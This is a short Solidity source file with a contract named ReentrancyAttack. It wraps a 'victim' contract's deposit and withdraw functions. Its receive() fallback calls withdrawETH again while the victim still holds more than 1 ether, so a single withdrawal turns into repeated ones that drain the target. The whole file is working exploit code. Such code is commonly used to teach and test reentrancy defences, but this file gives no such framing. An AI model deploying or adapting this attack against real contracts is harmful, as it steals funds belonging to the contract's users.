// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface victim {
    function depositETH() external payable;

    function withdrawETH(uint256) external;
}

contract ReentrancyAttack {
    victim Victim;

    constructor(address addr) {
        Victim = victim(addr);
    }

    function deposit() public payable {
        Victim.depositETH{value: msg.value}();
    }

    function withdrawETH(uint256 amount) public {
        Victim.withdrawETH(amount);
    }

    receive() external payable {
        if (address(Victim).balance > 1 ether) {
            Victim.withdrawETH(1 ether);
        }
    }
}
